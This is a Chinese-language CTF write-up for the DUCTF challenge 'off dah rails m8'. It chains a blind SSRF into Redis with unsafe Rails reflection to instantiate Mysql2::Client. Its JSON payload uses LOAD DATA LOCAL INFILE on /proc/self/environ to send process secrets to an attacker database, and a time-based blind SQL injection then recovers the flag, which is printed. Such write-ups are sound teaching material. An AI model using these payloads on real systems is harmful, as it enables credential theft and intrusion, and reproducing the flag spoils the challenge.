# off dah rails m8

## 题目简述

题目把 Go API gateway、Redis、Rails 和 MariaDB 放在同一容器。gateway 从 Basic Auth 的用户名查询 Redis、比较密码后才应代理到 Rails；Rails 也以同一 Redis token 鉴权。拿到认证能力后，Rails 会把 `config` 参数指定的 JSON 文件加载为对象，执行 `config_hash['type'].constantize.new(config_hash['arg'])`。这使攻击者可以选择任意已加载 Ruby 类及其初始化参数。

完整链为：gateway 缺少认证失败后的 `return` 加上 Basic Auth 未 URL 编码，造成到 Redis 的盲 SSRF；利用它写入一组已知 token；再经 `/proc/self/fd/<n>` 让 Rails 读取上传的 JSON，实例化 `Mysql2::Client`。该类的 `local_infile` 与 `init_command` 可把 Rails 进程环境导出到攻击者可控的数据库，泄露内部 MariaDB 凭据。最后仍通过同一反射点，以时间差盲注逐字恢复 flag。

## 解题过程

### 伪造 Redis 认证 token

gateway 的鉴权失败只写错误响应而没有终止处理：

```go
ar, err := ValidateAuthToken(req)
if err != nil || !ar {
    http.Error(w, "invalid authentication token", http.StatusUnauthorized)
}
// 仍会继续 buildAbsUrl、重写 URL 并 client.Do(newReq)
```

`buildAbsUrl` 还将 Basic Auth 中的用户名、密码直接拼进 URL userinfo：

```go
ba = u + ":" + p + "@"
return fmt.Sprintf("http://%s%s%s", ba, req.Host, req.URL.RequestURI()), nil
```

在 password 中使用 `#` 后的换行可避开 Go URL 对 fragment 控制字符的检查，并让重写正则不再按预期匹配。请求最终被发往 `127.0.0.1:6379`；选择 HTTP 方法 `SET`，并把目标 key 放进 request path，即可使 Redis 将 key 写成 `HTTP/1.1`。这是一条盲 SSRF，响应无需包含 Redis 输出。

得到例如 `<attacker-key> -> HTTP/1.1` 后，使用 `Authorization: Basic base64('<attacker-key>:HTTP/1.1')` 访问 Rails。所有示例中的 key、端口和连接地址均应按本地/竞赛环境替换，不能复用临时基础设施。

### 利用不安全反射泄露数据库凭据

Rails 控制器直接把攻击者选定的类名常量化并实例化：

```ruby
config_hash = JSON.load_file(config_file)
config_hash['type'].constantize.new(config_hash['arg'])
```

先上传下面的 JSON，再尝试 `/proc/self/fd/11` 起逐个文件描述符。Rack 会为上传临时文件打开 fd；请求过多后 fd 编号可能变化，因此应把“请求成功且攻击者数据库收到记录”作为重试条件，不应硬编码一个编号。

```json
{
  "type": "Mysql2::Client",
  "arg": {
    "host": "<attacker-db-host>",
    "port": 3306,
    "username": "<attacker-db-user>",
    "password": "<attacker-db-password>",
    "database": "<attacker-db>",
    "local_infile": true,
    "init_command": "LOAD DATA LOCAL INFILE '/proc/self/environ' INTO TABLE leak_env"
  }
}
```

`Mysql2::Client` 建连时执行 `init_command`。启用 `local_infile` 后，客户端把 Rails 进程的 `/proc/self/environ` 发送给攻击者数据库；其中包含由启动脚本提供的 `DB_USER` 和 `DB_PASSWORD`。题目启动脚本随后会清除 `FLAG`，故本步骤目标是数据库凭据而非直接读取 flag 环境变量。

### 时间盲注恢复 flag

有了内部数据库凭据，再上传同样经 fd 读取的配置。`init_command` 使用形如 `SELECT sleep(2) FROM flag WHERE flag LIKE BINARY 'DUCTF{<prefix>%';` 的查询，并把 `connect_timeout` 设为较短值。

当候选字符正确时查询睡眠时间超过客户端超时，Rails 请求表现为超时/500；错误字符会很快结束。按题目给出的 flag 字符集 `0123456789abcdef}` 从 `DUCTF{` 开始逐位枚举，直到匹配结束符。此处是数据库时间 oracle，不是将 SQL 返回值渲染到 HTTP 响应。

### 验证

每一步的可验证标志分别为：Redis 中出现新 token、攻击者数据库收到环境记录、某个前缀稳定触发超时。完整恢复结果为：

```text
DUCTF{6f1409b9f6}
```

## 方法总结

- 核心技巧：认证失败继续代理导致盲 SSRF 写 Redis，继而用 Ruby `constantize.new` 选择 `Mysql2::Client`，最后以 `init_command` 建立文件泄露和时间盲注链。
- 识别信号：反向代理把 Basic Auth 拼成 URL、鉴权失败分支未 `return`、同容器 Redis 作 token 存储，以及反射性类实例化共同出现时，应把它们按权限升级链审查。
- 复用要点：认证失败必须立即返回；禁止将 userinfo 字符串拼接为 URL。Rails 不应把类名/构造参数交给用户，数据库连接初始化也不应允许不可信 `init_command` 或本地文件导入。
